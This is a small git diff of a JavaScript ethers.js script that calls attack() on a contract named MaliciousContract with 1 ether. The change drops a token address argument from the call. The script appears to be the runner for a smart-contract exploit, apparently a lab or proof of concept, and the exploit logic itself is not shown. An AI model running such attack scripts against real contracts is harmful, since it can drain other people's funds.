@@ -18,7 +18,8 @@ async function main() {
     const attackAmount = ethers.utils.parseEther("1.0"); // Example: attacking with 1 ether
 
     try {
-        const tx = await MaliciousContract.attack(attackAmount, tokenAddress, { value: attackAmount });
+        const tx = await MaliciousContract.attack(attackAmount, { value: attackAmount });
+
 
         await tx.wait();
         console.log("Attack executed successfully. Transaction Hash:", tx.hash);
